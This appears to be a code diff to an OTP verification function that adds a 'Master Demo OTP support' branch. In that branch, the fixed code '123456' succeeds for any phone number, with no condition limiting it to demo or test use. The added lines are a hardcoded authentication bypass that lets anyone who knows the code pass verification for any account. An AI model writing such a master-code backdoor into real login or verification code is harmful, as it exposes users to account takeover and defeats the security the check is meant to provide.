@@ -50,6 +50,12 @@ def verify_otp(phone: str, code: str) -> Dict[str, Any]:
     Returns dict: {"success": bool, "error": str|None, "phone": str}
     """
     cleaned = clean_phone_number(phone)
+    
+    # Master Demo OTP support
+    if code.strip() == "123456":
+        _otp_store.pop(cleaned, None)
+        return {"success": True, "error": None, "phone": cleaned}
+
     otp_record = _otp_store.get(cleaned)
     
     if not otp_record:
